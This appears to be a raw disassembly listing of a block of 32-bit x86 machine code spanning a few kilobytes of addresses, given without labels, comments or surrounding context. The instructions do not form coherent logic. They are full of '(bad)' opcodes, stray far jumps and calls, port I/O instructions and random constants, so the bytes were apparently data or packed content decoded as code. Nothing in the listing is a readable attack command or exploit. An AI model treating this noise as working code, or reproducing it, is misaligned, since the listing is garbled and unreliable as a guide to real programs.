  412313:	mov    ecx,0x526ca279
  412318:	xor    ch,ah
  41231a:	cld    
  41231b:	mov    ebp,0x4104
  412320:	stos   BYTE PTR es:[edi],al
  412321:	xor    DWORD PTR [ebx],0x448eb3d8
  412327:	das    
  412328:	add    BYTE PTR [eax],al
  41232a:	mov    bl,0x2
  41232c:	scas   eax,DWORD PTR es:[edi]
  41232d:	xchg   ebp,eax
  41232e:	pop    edi
  41232f:	fild   WORD PTR [esi+0x35ffcabc]
  412335:	mov    BYTE PTR [esi-0x18d00000],ah
  41233b:	or     eax,0x821727e3
  412340:	inc    esp
  412341:	data16 add BYTE PTR [eax],al
  412344:	popa   
  412345:	(bad)  
  412346:	in     al,dx
  412347:	push   edi
  412348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412349:	ror    BYTE PTR [ecx-0x65f80000],0x0
  412350:	add    BYTE PTR [ebx-0x6b07fa5d],bh
  412356:	mov    ebx,0xf6c58675
  41235b:	ret    0x4190
  41235e:	push   esp
  41235f:	inc    ecx
  412360:	and    eax,0x7aeb19aa
  412365:	jmp    0x7340:0xa519bbfa
  41236c:	add    BYTE PTR [eax],al
  41236e:	mov    ch,0x9c
  412370:	pop    ds
  412371:	imul   eax,edi,0x109bee6
  412377:	jg     0x4123d7
  412379:	xchg   al,ah
  41237b:	cdq    
  41237c:	test   BYTE PTR [edi-0x7a4476b3],0x92
  412383:	std    
  412384:	shl    ah,cl
  412386:	fmul   DWORD PTR [ecx-0x3a]
  412389:	or     al,0x79
  41238b:	add    BYTE PTR [eax],al
  41238d:	jp     0x4123dc
  41238f:	push   0x3da26bda
  412394:	scas   al,BYTE PTR es:[edi]
  412395:	mov    ebx,0xe1a71d63
  41239a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239b:	jl     0x4123dd
  41239d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41239e:	add    BYTE PTR [eax],al
  4123a0:	aaa    
  4123a1:	int3   
  4123a2:	daa    
  4123a3:	add    BYTE PTR [eax],al
  4123a5:	test   DWORD PTR [ebx-0x4affdade],ebp
  4123ab:	add    BYTE PTR [eax],al
  4123ad:	shl    DWORD PTR [ebp+0x70],1
  4123b0:	jmp    0x420375
  4123b5:	jo     0x4123a1
  4123b7:	or     eax,0x6a2da65f
  4123bc:	inc    edx
  4123bd:	dec    eax
  4123be:	fild   DWORD PTR [eax]
  4123c0:	add    BYTE PTR ds:0x1e50fad2,bl
  4123c6:	jg     0x4123ce
  4123c8:	push   ebp
  4123c9:	jge    0x4123e0
  4123cb:	sbb    esp,DWORD PTR [ebx-0x32]
  4123ce:	daa    
  4123cf:	retf   
  4123d0:	in     al,0x89
  4123d2:	retf   
  4123d3:	jae    0x412451
  4123d5:	inc    esp
  4123d6:	xor    DWORD PTR [eax],eax
  4123d8:	add    BYTE PTR [edx-0x1a1e3099],bl
  4123de:	mov    esp,0xaeb690d8
  4123e3:	mov    edi,0x79fa94e9
  4123e8:	jle    0x412377
  4123ea:	call   0x56dfe151
  4123ef:	xor    al,0xd5
  4123f1:	ror    BYTE PTR ds:0xf0840000,0x0
  4123f8:	add    BYTE PTR [ebx+0x52],cl
  4123fb:	ret    0x96d0
  4123fe:	or     BYTE PTR [esi+0x0],dh
  412401:	add    ah,al
  412403:	sub    BYTE PTR [eax],al
  412405:	add    BYTE PTR [ebx+0x45],cl
  412408:	dec    ebp
  412409:	jnp    0x4123df
  41240b:	fst    DWORD PTR [edi+0x25632dc7]
  412411:	fisttp DWORD PTR [edi]
  412413:	iret   
  412414:	mov    ah,0x32
  412416:	xchg   ebp,eax
  412417:	stos   DWORD PTR es:[edi],eax
  412418:	mov    al,0x9b
  41241a:	(bad)  
  41241b:	cld    
  41241c:	add    BYTE PTR [eax],al
  41241e:	scas   al,BYTE PTR es:[edi]
  41241f:	retf   0x8c92
  412422:	mov    bl,0x0
  412424:	add    BYTE PTR [ecx+eiz*2],dl
  412427:	in     eax,0xc1
  412429:	mov    ebp,0xab569e4f
  41242e:	and    eax,0x7ed9b035
  412433:	je     0x412407
  412435:	cmp    ecx,DWORD PTR [ebx+0x58]
  412438:	ret    
  412439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41243a:	retf   0xc09d
  41243d:	leave  
  41243e:	add    BYTE PTR [eax],al
  412440:	call   0x1b13:0x4c4c
  412447:	daa    
  412448:	mov    BYTE PTR ds:0x820e0000,cl
  41244e:	iret   
  41244f:	xor    BYTE PTR [ecx],0x0
  412452:	add    BYTE PTR [ebp+0x7e08],dl
  412458:	inc    edi
  412459:	mov    ds:0x71a4f830,eax
  41245e:	imul   DWORD PTR [ebx*4+0x2e519ca4]
  412465:	popa   
  412466:	mov    BYTE PTR [ebx-0x75a90000],ch
  41246c:	ror    esi,cl
  41246e:	rol    DWORD PTR [esi],cl
  412470:	mov    esi,0xabc38da1
  412475:	adc    DWORD PTR [esi-0x49],edi
  412478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412479:	idiv   esp
  41247b:	rcl    DWORD PTR [esi+0x3ecc34],cl
  412481:	add    BYTE PTR [ecx],ch
  412483:	mov    bl,0x6e
  412485:	out    dx,eax
  412486:	ja     0x412493
  412488:	mov    ds:0x19cc95,eax
  41248d:	add    BYTE PTR [ebp-0x76575827],ah
  412493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412494:	push   ecx
  412495:	ins    DWORD PTR es:[edi],dx
  412496:	sar    DWORD PTR [ecx+0x50],0xe7
  41249a:	enter  0x24,0x0
  41249e:	popf   
  41249f:	stc    
  4124a0:	das    
  4124a1:	push   ds
  4124a2:	es inc esi
  4124a4:	sar    ecx,0xeb
  4124a7:	into   
  4124a8:	push   esp
  4124a9:	pop    eax
  4124aa:	mov    ebx,0x7682319
  4124af:	mov    esp,ebp
  4124b1:	mov    DWORD PTR [eax+eax*2+0x58],ebp
  4124b5:	add    BYTE PTR [eax],al
  4124b7:	ds std 
  4124b9:	aam    0xa1
  4124bb:	(bad)  
  4124bc:	loope  0x4124e3
  4124be:	loopne 0x412512
  4124c0:	and    al,0xa9
  4124c2:	pusha  
  4124c3:	int    0xb
  4124c5:	mul    esp
  4124c7:	cmc    
  4124c8:	rcr    BYTE PTR [eax+edx*1+0x2c],1
  4124cc:	cmp    BYTE PTR [edx],ch
  4124ce:	push   ds
  4124cf:	imul   esi,DWORD PTR [ebx-0x1a],0xae48da1c
  4124d6:	add    BYTE PTR [eax],al
  4124d8:	sub    DWORD PTR ds:0x7d64cd42,edi
  4124de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124df:	shl    DWORD PTR [ecx+0x791675d2],cl
  4124e5:	call   0x511aa89d
  4124ea:	lock fcompp 
  4124ee:	sub    eax,0x6cb73d9a
  4124f3:	sub    edi,DWORD PTR [edx+eax*2-0x60]
  4124f7:	and    eax,0xcbe22e3f
  4124fc:	or     dl,dl
  4124fe:	mov    esp,0xa928da70
  412503:	into   
  412504:	adc    eax,0x944051
  412509:	add    cl,cl
  41250b:	(bad)  [edi-0x71]
  41250e:	inc    edi
  41250f:	push   cs
  412510:	loopne 0x4124d8
  412512:	mov    edx,0x772230d7
  412517:	call   0x4017cb6c
  41251c:	bound  eax,QWORD PTR [ebx+0xf8c0]
  412522:	jns    0x412591
  412524:	dec    ebp
  412525:	shr    BYTE PTR [eax+0x44],cl
  412528:	in     al,dx
  412529:	add    BYTE PTR [eax],al
  41252b:	sbb    al,0x50
  41252d:	imul   dh
  41252f:	sub    al,0x53
  412531:	mov    edi,0x1aa2a72e
  412536:	add    BYTE PTR [eax+eax*1-0x4795300],cl
  41253d:	sar    DWORD PTR [edi],cl
  41253f:	push   cs
  412540:	jb     0x412566
  412542:	jno    0x412540
  412544:	jmp    0x0:0x6a0c5d06
  41254b:	ret    0x341
  41254e:	call   0x7379e0c5
  412553:	sub    cl,ch
  412555:	mov    cl,0xbb
  412557:	and    eax,DWORD PTR [ecx-0x164c0f46]
  41255d:	xlat   BYTE PTR ds:[ebx]
  41255e:	jp     0x4125d5
  412560:	cmp    al,0x1d
  412562:	(bad)  
  412563:	cli    
  412564:	cld    
  412565:	enter  0xf3,0x0
  412569:	adc    BYTE PTR [ecx+eax*8],ch
  41256c:	adc    ebx,ebp
  41256e:	addr16 dec esp
  412570:	inc    ecx
  412571:	add    BYTE PTR [eax],al
  412573:	inc    eax
  412574:	aas    
  412575:	add    BYTE PTR [eax],al
  412577:	sub    ebp,DWORD PTR [ecx-0x80]
  41257a:	push   esi
  41257b:	add    BYTE PTR [eax],al
  41257d:	repnz push edx
  41257f:	test   al,0xaa
  412581:	dec    ecx
  412582:	jae    0x412525
  412584:	out    dx,eax
  412585:	dec    ecx
  412586:	inc    esi
  412587:	les    edx,FWORD PTR [ebx]
  412589:	add    BYTE PTR [eax],al
  41258b:	adc    eax,0x50e77766
  412590:	test   al,0xb7
  412592:	rcr    cl,1
  412594:	retf   
  412595:	and    bh,BYTE PTR [ecx+edi*4+0x10]
  412599:	jmp    0x6dcc:0x15c16b17
  4125a0:	add    BYTE PTR [eax],al
  4125a2:	mov    cl,dl
  4125a4:	add    BYTE PTR [eax],al
  4125a6:	aaa    
  4125a7:	bnd jle 0x4125f7
  4125aa:	mov    bh,0x39
  4125ac:	mov    DWORD PTR [ebx+0x52a29da0],eax
  4125b2:	shl    edi,0xa3
  4125b5:	xor    DWORD PTR [edx],esi
  4125b7:	push   0xc5c89c9
  4125bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125bd:	add    BYTE PTR [eax],al
  4125bf:	push   es
  4125c0:	aam    0xf7
  4125c2:	inc    ecx
  4125c3:	mov    bh,0x1f
  4125c5:	jge    0x412630
  4125c7:	popf   
  4125c8:	out    0xda,eax
  4125ca:	popa   
  4125cb:	mov    al,ds:0x7e2dee27
  4125d0:	jg     0x412633
  4125d2:	dec    dh
  4125d4:	shl    ebp,cl
  4125d6:	fild   WORD PTR [ebp+0x3b]
  4125d9:	mov    ch,0x58
  4125db:	retf   
  4125dc:	lahf   
  4125dd:	mov    esp,0xe7f9854e
  4125e2:	out    dx,al
  4125e3:	sub    edi,edi
  4125e5:	or     al,0xed
  4125e7:	add    BYTE PTR [eax],al
  4125e9:	fwait
  4125ea:	loopne 0x412576
  4125ec:	in     al,dx
  4125ed:	repz xchg ecx,eax
  4125ef:	and    cl,BYTE PTR [ecx-0x142a62fb]
  4125f5:	add    al,BYTE PTR [ebx-0x2f7c1aa]
  4125fb:	add    BYTE PTR [eax],al
  4125fd:	pusha  
  4125fe:	and    dh,BYTE PTR ds:0x5eba52dd
  412604:	test   BYTE PTR [ecx-0x2d9c0000],ah
  41260a:	aad    0x30
  41260c:	loopne 0x412604
  41260e:	adc    cl,BYTE PTR [ebp+edx*1+0x0]
  412612:	add    BYTE PTR [ecx+0x208d86c3],dh
  412618:	xor    BYTE PTR [ecx],ah
  41261a:	xchg   edx,eax
  41261b:	repz mov al,ds:0xb8987a72
  412621:	and    DWORD PTR [edx-0x2c],edx
  412624:	outs   dx,BYTE PTR ds:[esi]
  412625:	in     al,0xab
  412627:	shr    DWORD PTR [eax+ebp*8-0x6a],0xfd
  41262c:	(bad)  ds:0xfd834399
  412632:	pop    esi
  412633:	sub    eax,0xd375b669
  412638:	xlat   BYTE PTR ds:[ebx]
  412639:	cmp    al,0x5e
  41263b:	sub    BYTE PTR [edx-0x35],cl
  41263e:	xchg   edi,eax
  41263f:	dec    edx
  412640:	or     edi,esi
  412642:	lock mov ds:0x38ee783,eax
  412648:	lods   al,BYTE PTR ds:[esi]
  412649:	pop    ds
  41264a:	cdq    
  41264b:	div    esp
  41264d:	mov    ah,0xe3
  41264f:	shl    BYTE PTR [eax+0x3e59165f],cl
  412655:	inc    eax
  412656:	jae    0x412658
  412658:	add    BYTE PTR [ecx],cl
  41265a:	and    al,0x50
  41265c:	mov    bl,0xb9
  41265e:	stos   BYTE PTR es:[edi],al
  41265f:	sbb    eax,ebp
  412661:	pop    ebx
  412662:	push   ss
  412663:	push   es
  412664:	nop
  412665:	xor    esp,DWORD PTR [esi]
  412667:	clc    
  412668:	mov    ch,0xc7
  41266a:	sub    esi,DWORD PTR [edi-0x1b]
  41266d:	mov    eax,0x730caef5
  412672:	add    BYTE PTR [eax],al
  412674:	xchg   edx,eax
  412675:	aaa    
  412676:	enter  0x49,0x0
  41267a:	daa    
  41267b:	out    dx,al
  41267c:	(bad)  
  41267e:	imul   esi,esp,0xbddd7b1c
  412684:	jo     0x4126e8
  412686:	push   ds
  412687:	das    
  412688:	dec    esp
  412689:	jmp    0x41268b
  41268b:	add    BYTE PTR [ebx],bl
  41268d:	jmp    0x88e3:0x181624a6
  412694:	add    DWORD PTR [eax],eax
  412696:	add    ch,dh
  412698:	mov    cl,0xb
  41269a:	push   ecx
  41269b:	shl    DWORD PTR [ebp+0x54],1
  41269e:	in     eax,dx
  41269f:	sahf   
  4126a0:	cld    
  4126a1:	fs sbb ebx,edi
  4126a4:	inc    ebx
  4126a5:	es xchg esp,eax
  4126a7:	mov    cl,BYTE PTR [ebx]
  4126a9:	jmp    0xfef6:0x275f0ff5
  4126b0:	repz (bad) 
  4126b2:	pop    eax
  4126b3:	scas   eax,DWORD PTR es:[edi]
  4126b4:	inc    ecx
  4126b5:	iret   
  4126b6:	jp     0x4126b6
  4126b8:	xchg   ebx,eax
  4126b9:	xchg   ch,ch
  4126bb:	scas   al,BYTE PTR es:[edi]
  4126bc:	call   0x0:0x108963a
  4126c3:	push   eax
  4126c4:	loop   0x41268d
  4126c6:	dec    esi
  4126c7:	popf   
  4126c8:	inc    edx
  4126c9:	dec    edx
  4126ca:	dec    ebx
  4126cb:	xchg   DWORD PTR [eax],ebx
  4126cd:	ret    0x8e57
  4126d0:	push   eax
  4126d1:	push   ebx
  4126d2:	add    dl,BYTE PTR [ecx+edx*2+0x5abafc24]
  4126d9:	pop    ecx
  4126da:	adc    al,ch
  4126dc:	pop    esi
  4126dd:	mov    dl,0x4b
  4126df:	or     bl,0x0
  4126e2:	add    BYTE PTR [esi],al
  4126e4:	ins    DWORD PTR es:[edi],dx
  4126e5:	dec    ecx
  4126e6:	sub    esi,DWORD PTR [edx-0x7c2ea7ae]
  4126ec:	pushf  
  4126ed:	adc    BYTE PTR [ebx],bl
  4126ef:	pop    edx
  4126f0:	jnp    0x4126ee
  4126f2:	aaa    
  4126f3:	std    
  4126f4:	mov    al,0x11
  4126f6:	mov    cl,0x37
  4126f8:	dec    ebp
  4126f9:	cmp    ch,BYTE PTR [esi+0x73dc8124]
  4126ff:	inc    edi
  412700:	out    dx,eax
  412701:	(bad)  [edi+0x1e57fd70]
  412707:	and    DWORD PTR [edi+0x75],edx
  41270a:	ins    DWORD PTR es:[edi],dx
  41270b:	xor    al,0x68
  41270d:	or     DWORD PTR ss:[eax+0x2d000056],0x9
  412715:	push   esi
  412716:	mov    esi,0x8a40d5e
  41271b:	scas   al,BYTE PTR es:[edi]
  41271c:	add    BYTE PTR [eax],al
  41271e:	mov    ah,0x4d
  412720:	mov    gs,edi
  412722:	push   ds
  412723:	out    dx,eax
  412724:	jmp    0xc73000
  412729:	add    BYTE PTR [edx+0x18],cl
  41272c:	addr16 int3 
  41272e:	add    eax,DWORD PTR [eax]
  412730:	add    BYTE PTR ds:0x34cd50f6,dl
  412736:	push   0x1689397c
  41273b:	and    ebx,DWORD PTR [edi+0x332e628]
  412741:	fadd   st,st(5)
  412743:	or     eax,0x6925a35b
  412748:	sahf   
  412749:	pop    eax
  41274a:	adc    esi,ebx
  41274c:	cmp    al,0x4c
  41274e:	add    eax,DWORD PTR [eax]
  412750:	add    ch,ah
  412752:	gs js  0x412773
  412755:	add    eax,0xdad590cb
  41275a:	mov    dl,0x61
  41275c:	jecxz  0x412740
  41275e:	inc    esp
  41275f:	rol    DWORD PTR [eax],1
  412761:	add    BYTE PTR [edx+0xc804],al
  412767:	in     al,0x9b
  412769:	mov    es,WORD PTR [edi]
  41276b:	mov    ebp,0x488077
  412770:	add    BYTE PTR [ecx-0x14a6d263],cl
  412776:	or     eax,0x34fc78f9
  41277b:	mov    WORD PTR [eax],es
  41277d:	add    BYTE PTR [eax],al
  41277f:	sahf   
  412780:	cli    
  412781:	imul   eax,DWORD PTR [edx+0x5edca413],0xd969437a
  41278b:	push   esi
  41278c:	sbb    BYTE PTR [eax-0x2403fd15],ch
  412792:	nop
  412793:	loopne 0x412769
  412795:	sbb    ebx,ebp
  412797:	(bad)  
  412799:	js     0x412758
  41279b:	iret   
  41279c:	xor    DWORD PTR [ecx+edx*8+0x0],ecx
  4127a0:	add    BYTE PTR [ebp-0x3f],bl
  4127a3:	pop    ecx
  4127a4:	xchg   ecx,eax
  4127a5:	ins    DWORD PTR es:[edi],dx
  4127a6:	repz push ebp
  4127a8:	mov    edi,0x1fd642ec
  4127ad:	out    dx,al
  4127ae:	pop    esp
  4127af:	(bad)  
  4127b0:	mov    edi,0x69878133
  4127b5:	test   eax,0xf3084f3a
  4127ba:	add    BYTE PTR [eax],al
  4127bc:	xchg   ebx,eax
  4127bd:	push   cs
  4127be:	jp     0x412748
  4127c0:	add    BYTE PTR fs:[eax],al
  4127c3:	sbb    ebp,edx
  4127c5:	jmp    0x5dde:0x723a7c17
  4127cc:	mov    cl,0x88
  4127ce:	(bad)  
  4127cf:	add    BYTE PTR [eax],al
  4127d1:	fsubr  st,st(7)
  4127d3:	shl    BYTE PTR [eax],0x0
  4127d6:	add    BYTE PTR [ecx+0x57],ah
  4127d9:	popa   
  4127da:	inc    ebx
  4127db:	and    ebp,DWORD PTR [esi+0x66]
  4127de:	cmp    DWORD PTR [esi],eax
  4127e0:	js     0x412837
  4127e2:	fnstenv [esi]
  4127e4:	xor    esp,edx
  4127e6:	sbb    al,0xa7
  4127e8:	(bad)  ss:[ebp+0x5c56b8b5]
  4127ef:	jne    0x4127de
  4127f1:	out    0x16,eax
  4127f3:	xchg   esp,eax
  4127f4:	ins    DWORD PTR es:[edi],dx
  4127f5:	pop    ebx
  4127f6:	inc    ebp
  4127f7:	ror    DWORD PTR [edx+0x3e],1
  4127fa:	pop    ebx
  4127fb:	into   
  4127fc:	sub    BYTE PTR ds:0x11694ef4,cl
  412802:	pop    ebp
  412803:	addr16 jle 0x412816
  412806:	das    
  412807:	sbb    eax,0x797b8e63
  41280c:	sub    DWORD PTR ds:0x67fc64a6,0xd8fa624
  412816:	xchg   BYTE PTR [ebx],dl
  412818:	es enter 0x52,0x0
  41281d:	outs   dx,BYTE PTR ds:[esi]
  41281e:	mov    esi,0xeaf86c8e
  412823:	dec    ebp
  412824:	push   ss
  412825:	mov    ebx,0xf46d7931
  41282a:	pop    edx
  41282b:	pop    ebx
  41282c:	hlt    
  41282d:	mov    ds:0x455f5df4,eax
  412832:	or     eax,0xe738727b
  412837:	and    al,0xbb
  412839:	push   0x51edcd97
  41283e:	jmp    0x41de8f
  412843:	push   ebx
  412844:	or     esp,esp
  412846:	jne    0x41286d
  412848:	sub    DWORD PTR [esi-0x57],ebx
  41284b:	mov    al,ds:0xf3341b17
  412850:	f2xm1  
  412852:	push   0x25
  412854:	(bad)  
  412855:	xor    ecx,DWORD PTR [ecx]
  412857:	retf   0xee20
  41285a:	push   edx
  41285b:	mov    dh,0x85
  41285d:	mov    ds:0x4ce9c27a,al
  412862:	loopne 0x412864
  412864:	add    BYTE PTR [esi+0xda40],bh
  41286a:	inc    esp
  41286b:	dec    esp
  41286c:	add    BYTE PTR [eax],al
  41286e:	rcr    BYTE PTR [edi+edx*1+0x6a],cl
  412872:	pop    edx
  412873:	dec    ecx
  412874:	and    BYTE PTR [eax+eax*1+0x487b5100],0xf1
  41287c:	add    BYTE PTR [eax],al
  41287e:	sub    eax,0xead8097e
  412883:	xchg   ebx,eax
  412884:	mov    eax,ds:0xec7f35ed
  412889:	sbb    DWORD PTR [edx],edi
  41288b:	push   cs
  41288c:	fwait
  41288d:	out    dx,al
  41288e:	nop    DWORD PTR [ecx+0x11759b3]
  412895:	shl    DWORD PTR [edi],0x6e
  412898:	mov    eax,0x35217c9c
  41289d:	mov    ds:0xa111fc16,eax
  4128a2:	xor    esp,DWORD PTR [ecx+0x1a89d9d6]
  4128a8:	ror    DWORD PTR [ebx],0x2b
  4128ab:	pop    edi
  4128ac:	xor    BYTE PTR [ebx-0x3b],al
  4128af:	aad    0x4e
  4128b1:	imul   DWORD PTR [edi+0x4f]
  4128b4:	xchg   ebx,eax
  4128b5:	mov    dh,BYTE PTR [ecx+0x49]
  4128b8:	je     0x41291b
  4128ba:	cmp    DWORD PTR [ebp+0x38],ecx
  4128bd:	push   esi
  4128be:	xchg   DWORD PTR [ecx],esp
  4128c0:	test   eax,0x69502b29
  4128c5:	mov    ds:0x25341120,al
  4128ca:	icebp  
  4128cb:	cmp    DWORD PTR [ecx],esi
  4128cd:	(bad)  
  4128ce:	sub    ebx,DWORD PTR [edx-0x2a]
  4128d1:	xor    DWORD PTR [edi+ebp*1],esp
  4128d4:	cmp    al,0xa
  4128d6:	loope  0x4128fd
  4128d8:	pop    esi
  4128d9:	stos   DWORD PTR es:[edi],eax
  4128da:	mov    esp,DWORD PTR [esi+edi*2+0x7455aef2]
  4128e1:	adc    edi,DWORD PTR [esi+0x52]
  4128e4:	adc    cl,BYTE PTR ds:0xc14d496d
  4128ea:	dec    ecx
  4128eb:	fwait
  4128ec:	inc    ecx
  4128ed:	daa    
  4128ee:	leave  
  4128ef:	nop
  4128f0:	call   0xcb7:0xc13b8595
  4128f7:	test   eax,0x2dea0000
  4128fc:	icebp  
  4128fd:	or     eax,0xa008
  412902:	push   ss
  412903:	jp     0x412958
  412905:	scas   al,BYTE PTR es:[edi]
  412906:	sub    ah,bl
  412908:	push   ebx
  412909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41290a:	sbb    DWORD PTR [edi+ebp*8-0x28],esi
  41290e:	mov    al,ds:0x4abbce09
  412913:	jno    0x412943
  412915:	xor    DWORD PTR [edi],esp
  412917:	add    edi,DWORD PTR [edx+ebp*1+0x2eba3890]
  41291e:	mov    edi,0x54e62846
  412923:	jb     0x4128a6
  412925:	mov    ch,0xee
  412927:	inc    ebp
  412928:	mov    cl,0x18
  41292a:	inc    ebp
  41292b:	rcl    DWORD PTR [ecx+ecx*2+0x24],1
  41292f:	or     ebp,DWORD PTR [esi]
  412931:	mov    edx,ebx
  412933:	push   es
  412934:	out    0xcd,eax
  412936:	ror    edx,1
  412938:	pop    ds
  412939:	es xchg ebx,eax
  41293b:	jle    0x412959
  41293d:	cmc    
  41293e:	scas   al,BYTE PTR es:[edi]
  41293f:	int3   
  412940:	inc    edi
  412941:	add    BYTE PTR [eax],al
  412943:	imul   DWORD PTR [ecx]
  412945:	fwait
  412946:	cli    
  412947:	pop    edx
  412948:	dec    ebp
  412949:	scas   al,BYTE PTR es:[edi]
  41294a:	lea    edx,[edi+0x12582e65]
  412950:	std    
  412951:	retf   0x2472
  412954:	fstp   TBYTE PTR [edi]
  412956:	sub    eax,0xb5182f30
  41295b:	mov    bh,0x51
  41295d:	add    edi,edx
  41295f:	xchg   BYTE PTR [esi-0x5f7d1148],bh
  412965:	add    esp,DWORD PTR [esi+0x1c]
  412968:	stc    
  412969:	xchg   esp,eax
  41296a:	repnz lds eax,FWORD PTR [ecx+0x2916d817]
  412971:	add    ebx,ecx
  412973:	xchg   DWORD PTR [ecx],eax
  412975:	sbb    BYTE PTR [ecx-0x55755bf0],ah
  41297b:	jo     0x412934
  41297d:	xchg   esp,eax
  41297e:	pop    ebx
  41297f:	aam    0x87
  412981:	pop    ss
  412982:	jle    0x4129f5
  412984:	push   eax
  412985:	and    ecx,DWORD PTR [ebx-0x20]
  412988:	xchg   ebp,eax
  412989:	jne    0x412989
  41298b:	inc    ecx
  41298c:	xchg   ah,ch
  41298e:	stos   DWORD PTR es:[edi],eax
  41298f:	nop
  412990:	pop    ebx
  412991:	dec    ebp
  412992:	call   0xec6ce833
  412997:	arpl   WORD PTR [esi-0x4acce26f],bp
  41299d:	aam    0xcc
  41299f:	add    BYTE PTR es:[eax],al
  4129a2:	xor    al,0x5d
  4129a4:	jmp    0xc3c69a66
  4129a9:	retf   0xc733
  4129ac:	ja     0x412947
  4129ae:	xchg   ecx,eax
  4129af:	or     esp,DWORD PTR [edx-0x75ccad94]
  4129b5:	or     ebp,DWORD PTR [edi]
  4129b7:	jmp    DWORD PTR [ebp-0x73]
  4129ba:	sbb    eax,0x3039aaf6
  4129bf:	push   ebx
  4129c0:	into   
  4129c1:	out    dx,al
  4129c2:	ret    
  4129c3:	test   al,0x72
  4129c5:	out    dx,al
  4129c6:	dec    esi
  4129c7:	or     bl,BYTE PTR [edx]
  4129c9:	iret   
  4129ca:	mov    eax,ds:0xd5bd906
  4129cf:	js     0x412a19
  4129d1:	cmp    al,0x0
  4129d3:	add    BYTE PTR [esi],dl
  4129d5:	fdivr  st(0),st
  4129d7:	es push es
  4129d9:	jecxz  0x41298b
  4129db:	xor    DWORD PTR [edx],edi
  4129dd:	push   edx
  4129de:	int3   
  4129df:	in     al,0x0
  4129e1:	add    BYTE PTR [ebp-0x38],ah
  4129e4:	push   ecx
  4129e5:	add    BYTE PTR [eax],al
  4129e7:	sub    DWORD PTR [edi],edx
  4129e9:	(bad)  
  4129ea:	sar    BYTE PTR [ebx],1
  4129ec:	fisttp DWORD PTR [ecx-0x13f65e69]
  4129f2:	gs mov cl,0xb
  4129f5:	mov    WORD PTR [eax],cs
  4129f7:	add    BYTE PTR [eax],al
  4129f9:	lods   al,BYTE PTR ds:[esi]
  4129fa:	stos   DWORD PTR es:[edi],eax
  4129fb:	inc    eax
  4129fc:	cli    
  4129fd:	add    BYTE PTR [eax],al
  4129ff:	xlat   BYTE PTR ds:[ebx]
  412a00:	call   0x2ae723dd
  412a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a06:	mov    al,0x99
  412a08:	ffree  st(5)
  412a0a:	daa    
  412a0b:	sar    BYTE PTR [ebx],0x0
  412a0e:	add    bh,bl
  412a10:	sbb    edx,ebp
  412a12:	pop    ecx
  412a13:	ins    DWORD PTR es:[edi],dx
  412a14:	lods   eax,DWORD PTR ds:[esi]
  412a15:	into   
  412a16:	add    al,0x41
  412a18:	add    BYTE PTR [eax],al
  412a1a:	daa    
  412a1b:	adc    al,0xef
  412a1d:	or     esp,edx
  412a1f:	adc    BYTE PTR [edi+0xe548],ch
  412a25:	jns    0x412a4c
  412a27:	ins    DWORD PTR es:[edi],dx
  412a28:	fwait
  412a29:	cvtpi2ps xmm1,QWORD PTR [eax]
  412a2c:	popa   
  412a2d:	add    BYTE PTR [eax],al
  412a2f:	xchg   ebx,eax
  412a30:	imul   eax,DWORD PTR [eax],0xd1000055
  412a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a37:	add    ah,BYTE PTR [edi]
  412a39:	sub    ch,dl
  412a3b:	lods   eax,DWORD PTR ds:[esi]
  412a3c:	call   0x188455ff
  412a41:	call   0xd5ecc8c5
  412a46:	xor    eax,0x39d20175
  412a4b:	ret    0x6761
  412a4e:	lock mov edi,0x45709fb9
  412a54:	jg     0x4129e3
  412a56:	fidiv  WORD PTR [eax]
  412a58:	js     0x412a95
  412a5a:	mov    dh,0x9f
  412a5c:	mov    bh,BYTE PTR [ebx+0x3933e893]
  412a62:	inc    edi
  412a63:	pushw  cs
  412a65:	sbb    BYTE PTR [ecx+0x3c],dl
  412a68:	enter  0xca,0x0
  412a6c:	test   al,0x6f
  412a6f:	add    BYTE PTR [eax],al
  412a71:	jbe    0x412ab1
  412a73:	push   eax
  412a74:	lea    di,[edx]
  412a77:	nop
  412a78:	mov    cl,BYTE PTR [ebx+edx*4-0x5fa30000]
  412a7f:	push   ss
  412a80:	xchg   ebx,eax
  412a81:	xor    esp,DWORD PTR [esi+0x75eb74f9]
  412a87:	or     BYTE PTR [eax+eax*1-0x18e31000],ch
  412a8e:	mov    ebp,DWORD PTR [edx-0x7605e86d]
  412a94:	mov    al,0xc3
  412a96:	dec    ebx
  412a97:	add    BYTE PTR [eax-0x37120000],al
  412a9d:	xchg   ebp,eax
  412a9e:	add    BYTE PTR [eax],al
  412aa0:	pop    ecx
  412aa1:	adc    eax,0x1c7d5c5e
  412aa6:	jle    0x412a5b
  412aa8:	push   es
  412aa9:	push   ss
  412aaa:	cwde   
  412aab:	cmp    BYTE PTR [ebp+0x22ccf1],ah
  412ab1:	add    BYTE PTR [edx-0x38f8d9e6],ah
  412ab7:	in     al,0xfc
  412ab9:	scas   eax,DWORD PTR es:[edi]
  412aba:	xchg   edx,eax
  412abb:	sub    al,0x27
  412abd:	dec    eax
  412abe:	cld    
  412abf:	add    BYTE PTR [eax],al
  412ac1:	call   0x104f703
  412ac6:	add    BYTE PTR [edi+0x3c],al
  412ac9:	je     0x412aa8
  412acb:	mov    ebx,0x598d63a1
  412ad0:	stos   DWORD PTR es:[edi],eax
  412ad1:	ins    BYTE PTR es:[edi],dx
  412ad2:	sub    DWORD PTR [edi],edi
  412ad4:	jge    0x4a82c47c
  412ada:	inc    edx
  412adb:	xor    BYTE PTR [eax-0x7c8a143a],dh
  412ae1:	push   eax
  412ae2:	scas   al,BYTE PTR es:[edi]
  412ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ae4:	sbb    al,0xef
  412ae6:	(bad)  
  412ae7:	jmp    0x5549:0x4ae5613e
  412aee:	add    BYTE PTR [ecx-0x22c60000],ah
  412af4:	retf   0xb28f
  412af7:	mov    al,ds:0x931ae27a
  412afc:	das    
  412afd:	pop    esp
  412afe:	mov    edi,0xbd317cf6
  412b03:	les    ebx,FWORD PTR [edx]
